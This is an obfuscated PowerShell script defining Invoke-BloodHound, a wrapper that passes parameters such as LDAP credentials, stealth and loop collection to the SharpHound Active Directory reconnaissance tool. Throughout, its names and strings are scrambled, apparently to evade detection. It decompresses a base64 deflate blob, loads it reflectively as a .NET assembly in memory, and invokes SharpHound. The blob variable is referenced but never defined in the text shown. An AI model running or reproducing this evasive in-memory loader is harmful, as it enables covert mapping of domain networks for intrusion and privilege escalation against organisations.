 Sv ( "B" +"U57"  )  (    [TYpE]( "{2}{1}{0}" -F 'rT','Nve','co'  )   )   ;  SET-varIAblE (  "qh3f5"+"o" ) ( [TYPE](  "{3}{4}{2}{1}{5}{0}{6}"-F 'IOnmO','N','pReSSio','IO.c','oM','.COmpresS','DE' )  ) ;   $mlxED  =[tYPE](  "{3}{0}{1}{2}" -f 'O','N.ASs','EMBlY','reFlEcti'  )    ;   function i`NvoKe-BlOOd`hOu`Nd
{

    [CmdletBinding(  PositionalBinding =  ${FaL`sE} )]
    param(  
        [Alias("c" )]
        [String[]]
        ${co`LleCT`Ionm`e`ThO`DS} =  [String[]]@(("{1}{2}{0}" -f't','Defau','l')),

        [Alias( "d")]
        [String]
        ${dOm`A`In},
        
        [Alias( "s")]
        [Switch]
        ${seaRCh`Fo`Re`st},

        [Switch]
        ${s`TEAl`TH},

        [String]
        ${L`DaPfil`TeR},

        [String]
        ${d`ist`iNG`U`iShe`dNaME},

        [String]
        ${C`Omp`UT`ErFI`le},

        [ValidateScript(  {  &( 'Test'+  '-Pa'  +'th') -Path ${_} })]
        [String]
        ${O`UT`PuT`DIRectO`Ry}  =   $( & (  'Get-Lo'+  'c'  +  'ation'  )   ),

        [ValidateNotNullOrEmpty(  )]
        [String]
        ${OuTPU`T`prefiX},

        [String]
        ${C`AcH`ENAmE},

        [Switch]
        ${mEM`C`Ac`hE},

        [Switch]
        ${rE`BuilDcac`HE},

        [Switch]
        ${R`And`omFiLeN`A`MeS},

        [String]
        ${z`IP`FILeN`AmE},
        
        [Switch]
        ${n`OZiP},
        
        [String]
        ${zi`pP`As`sWoRD},
        
        [Switch]
        ${Track`cO`m`p`UteRCAL`Ls},
        
        [Switch]
        ${pR`e`TtyPRI`Nt},

        [String]
        ${LDa`pUsE`Rn`AmE},

        [String]
        ${LdapP`ASSwO`Rd},

        [string]
        ${D`OMA`i`NcOnTro`ll`eR},

        [ValidateRange(0, 65535)]
        [Int]
        ${lD`APpo`RT},

        [Switch]
        ${sE`CU`Re`LDAp},
        
        [Switch]
        ${DIsab`LEcErTV`ER`I`Fi`caT`IoN},

        [Switch]
        ${D`I`sabl`esIgnI`Ng},

        [Switch]
        ${SkIPp`Or`TCHECk},

        [ValidateRange( 50, 5000)]
        [Int]
        ${Po`RtcHe`cKTIme`ouT} =  500,

        [Switch]
        ${s`ki`Ppa`s`sWordchE`ck},

        [Switch]
        ${eXClU`De`DCS},

        [Int]
        ${T`HR`OTT`le},

        [ValidateRange(  0, 100)]
        [Int]
        ${Ji`T`TEr},

        [Int]
        ${tH`ReA`dS},

        [Switch]
        ${sKIP`RE`GiStR`yLoGGE`DOn},

        [String]
        ${OVe`RrID`EUsERN`AME},

        [String]
        ${rEAlD`N`Sn`AmE},

        [Switch]
        ${C`O`Ll`e`cTalLproPeRt`IEs},

        [Switch]
        ${L`OOp},

        [String]
        ${LoOp`dUR`AtI`on},

        [String]
        ${loopiNTE`RV`Al},

        [ValidateRange( 500, 60000  )]
        [Int]
        ${STa`T`USiNT`ErVAl},
        
        [Alias( "v" )]
        [ValidateRange(0, 5 )]
        [Int]
        ${VERBO`s`iTY},

        [Alias(  "h")]
        [Switch]
        ${hE`Lp},

        [Switch]
        ${V`ERSioN}
      )

    ${VA`RS}  =  & ('New-Ob' +'je'+'ct') ( 'Sy'  +  'stem'  +'.Col'+ 'lec'  +'tions'+  '.'  + 'Gen' +'e'  + 'ri'+'c.L' +  'ist[S'+  'ystem.' +'Object]')
    
    if( !( ${P`S`B`OUND`PaRaME`TerS}.ContainsKey( ("{0}{1}"-f'he','lp'  )) -or ${Ps`BOu`N`d`PaRamETErs}.ContainsKey(( "{0}{1}{2}"-f 've','rs','ion')  ) ) ){
        ${ps`BoUndparA`Me`TerS}.Keys   |    &(  '%' ) {
            if (${_} -notmatch (  "{1}{0}"-f 'sity','verbo'  )  ){
                ${v`ArS}.add( "--$_" )
                if(  ${PSbO`U`ND`paRam`eTERs}.item(  ${_} ).gettype( ).name -notmatch ("{1}{0}"-f'itch','sw'  )){
                    ${v`ARS}.add(  ${Psbo`U`NdpA`Ram`e`TERs}.item( ${_}  )  )
                }
            }
            elseif (${_} -match (  "{2}{1}{0}"-f 'osity','erb','v' ) ) {
                ${VA`RS}.add( "-v" )
                ${VA`Rs}.add( ${PSBouNdP`A`RAm`etE`Rs}.item( ${_}  ))
            }
        }
    }
    else {
        ${PS`B`oUNDpAr`AmETE`RS}.Keys  | &( '?'  ) {${_} -match (  "{0}{1}"-f'he','lp'  ) -or ${_} -match ( "{0}{1}"-f 'versio','n'  )}  | &  (  '%'  ) {
            ${Va`Rs}.add("--$_" )
        }
    }
    
    ${p`AsSEd} =   [string[]]${V`Ars}.ToArray(    )

	${dEFLaT`ED`S`Tr`EaM}   =    &  (  'Ne'  + 'w' +'-Object') (  'IO.' +  'Compression.' +'DeflateS'  +'tre'+ 'am' )([IO.MemoryStream]  $Bu57::FromBase64String(  ${ENcO`de`D`COmPRESs`EDF`I`LE} ),  (   ITEM  ("V"  +  "ariaBle"+ ":qh" +"3f5o"  ) ).vaLUE::Decompress )
	${UNcOmPr`ES`s`eDFil`eBytes}   =     &  ( 'New-'  +  'Obj'+'ect' ) ( 'By' +  'te[]' )(  1046528 )
	${DeF`la`TEDStrEAM}.Read(  ${U`NCOmPRe`SSeDf`ILEBy`Tes}, 0, 1046528  )  |  & ('Out'+  '-Null' )
	${ASseM`Bly}  =    $MlXED::Load( ${uNCOmP`Res`SE`d`FIlEByT`ES}  )
	${b`indI`NGfLags} =  [Reflection.BindingFlags] (  "{1}{2}{0}" -f'ic','Pub','lic,Stat'  )
	${a}   = @(  )
	${AsSe`M`BlY}.GetType(  ( "{1}{3}{2}{0}"-f 'der','Cos','ra.AssemblyLoa','tu'), ${f`AlSE}  ).GetMethod( ("{0}{1}{2}"-f'A','tt','ach'), ${BIN`DiN`GFla`GS}).Invoke(${N`UlL}, @( ))
	${a`ssEMBLY}.GetType(  ( "{4}{5}{2}{1}{3}{0}"-f 'am','ro','P','gr','Sharph','ound.') ).GetMethod((  "{0}{3}{2}{1}"-f'Invo','ound','arpH','keSh'  )  ).Invoke(  ${N`ULL}, @(,${PAss`eD}  ) )
}
